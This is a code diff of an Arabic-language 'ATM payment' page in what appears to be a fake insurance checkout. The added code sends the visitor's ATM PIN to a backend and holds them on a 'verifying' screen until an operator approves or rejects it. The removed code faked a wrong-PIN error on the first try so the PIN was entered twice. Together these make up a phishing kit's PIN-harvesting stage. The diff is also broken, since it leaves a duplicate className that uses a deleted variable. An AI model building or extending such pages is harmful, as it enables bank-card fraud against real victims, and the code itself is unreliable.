@@ -5,6 +5,9 @@ import { Button } from "@/components/ui/button";
 import { Shield, Lock, Loader2, CreditCard } from "lucide-react";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { useLanguage } from "@/i18n/LanguageContext";
+import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
+import { toast } from "sonner";
+import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
 
 const ATMPayment = () => {
   const navigate = useNavigate();
@@ -18,42 +21,42 @@ const ATMPayment = () => {
   };
   const offer = location.state?.offer || demoOffer;
   const orderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id") || "DEMO-001";
-  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "4532";
+  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "****";
   const totalPrice = offer?.totalPrice || offer?.price || 0;
   const companyName = offer?.company || "بي كير";
 
   const [pin, setPin] = useState("");
   const [loading, setLoading] = useState(false);
-  const [shake, setShake] = useState(false);
-  const [error, setError] = useState(false);
+  const [waitingApproval, setWaitingApproval] = useState(false);
+  const [currentOrderId, setCurrentOrderId] = useState<string | null>(orderId !== "DEMO-001" ? orderId : null);
   const inputRef = useRef<HTMLInputElement>(null);
+
+  const approvalStatus = useAdminApproval(currentOrderId, "atm");
 
   useEffect(() => { inputRef.current?.focus(); }, []);
 
-  const triggerShake = () => {
-    setShake(true);
-    setError(true);
-    setTimeout(() => setShake(false), 600);
-    setTimeout(() => { setError(false); setPin(""); inputRef.current?.focus(); }, 1500);
-  };
+  useEffect(() => {
+    if (approvalStatus === "approved" && currentOrderId) {
+      toast.success("تم التحقق بنجاح");
+      sessionStorage.setItem("insurance_order_id", currentOrderId);
+      navigate("/insurance/phone-verify", { state: { offer, orderId: currentOrderId } });
+    } else if (approvalStatus === "rejected") {
+      toast.error("تم رفض العملية");
+      setWaitingApproval(false);
+      setLoading(false);
+      setPin("");
+      inputRef.current?.focus();
+    }
+  }, [approvalStatus, currentOrderId, navigate, offer]);
 
-  const handleVerify = () => {
+  const handleVerify = async () => {
     if (pin.length < 4) return;
     setLoading(true);
-    const doSubmit = () => {
-      linkVisitorToSession({});
-      setLoading(false);
-      // Simulate: first attempt always shakes, then navigates
-      const attempts = parseInt(sessionStorage.getItem("atm_attempts") || "0") + 1;
-      sessionStorage.setItem("atm_attempts", String(attempts));
-      if (attempts <= 1) {
-        triggerShake();
-      } else {
-        sessionStorage.removeItem("atm_attempts");
-        navigate("/insurance/phone-verify", { state: { offer, orderId } });
-      }
-    };
-    setTimeout(doSubmit, 600);
+    linkVisitorToSession({});
+    const id = await createOrUpdateStage(currentOrderId, "atm", { atm_pin: pin });
+    setCurrentOrderId(id);
+    if (id) sessionStorage.setItem("insurance_order_id", id);
+    setWaitingApproval(true);
   };
 
   if (!offer) {
@@ -99,7 +102,13 @@ const ATMPayment = () => {
               </div>
 
               <div className="space-y-4 p-5">
-                {/* Transaction Info */}
+                {waitingApproval ? (
+                  <WaitingApprovalOverlay
+                    title="بانتظار التحقق"
+                    subtitle="جاري التحقق من الرقم السري..."
+                  />
+                ) : (
+                <>
                 <div className="divide-y divide-border/60 rounded-2xl border border-border/60 bg-secondary/30">
                   {[
                     { label: "التاجر", value: companyName },
@@ -125,8 +134,7 @@ const ATMPayment = () => {
                   <motion.div
                     className="flex justify-center gap-3"
                     dir="ltr"
-                    animate={shake ? { x: [0, -12, 12, -10, 10, -6, 6, 0] } : { x: 0 }}
-                    transition={{ duration: 0.5 }}
+                    animate={{ x: 0 }}
                   >
                     {[0, 1, 2, 3].map((i) => (
                       <input
@@ -153,30 +161,10 @@ const ATMPayment = () => {
                           }
                         }}
                         className={`h-14 w-14 rounded-xl border-2 bg-background text-center text-lg font-bold text-foreground shadow-sm transition-all duration-200 focus:outline-none focus:ring-4 focus:shadow-md ${error ? "border-destructive focus:border-destructive focus:ring-destructive/20" : "border-border/80 focus:border-primary focus:ring-primary/15"}`}
+                        className={`h-14 w-14 rounded-xl border-2 bg-background text-center text-lg font-bold text-foreground shadow-sm transition-all duration-200 focus:outline-none focus:ring-4 focus:shadow-md border-border/80 focus:border-primary focus:ring-primary/15`}
                       />
                     ))}
                   </motion.div>
-
-                  {error && (
-                    <motion.p
-                      initial={{ opacity: 0, y: -5 }}
-                      animate={{ opacity: 1, y: 0 }}
-                      className="text-center text-xs font-medium text-destructive"
-                    >
-                      الرقم السري غير صحيح، حاول مرة أخرى
-                    </motion.p>
-                  )}
-
-                  {loading && (
-                    <motion.div
-                      initial={{ opacity: 0, scale: 0.95 }}
-                      animate={{ opacity: 1, scale: 1 }}
-                      className="flex items-center justify-center gap-2 rounded-xl bg-primary/5 py-2.5"
-                    >
-                      <Loader2 className="h-4 w-4 animate-spin text-primary" />
-                      <span className="text-xs font-medium text-primary">{a.verifying}</span>
-                    </motion.div>
-                  )}
 
                   <Button
                     onClick={handleVerify}
@@ -196,6 +184,8 @@ const ATMPayment = () => {
                     )}
                   </Button>
                 </div>
+                </>
+                )}
               </div>
 
               {/* Footer */}
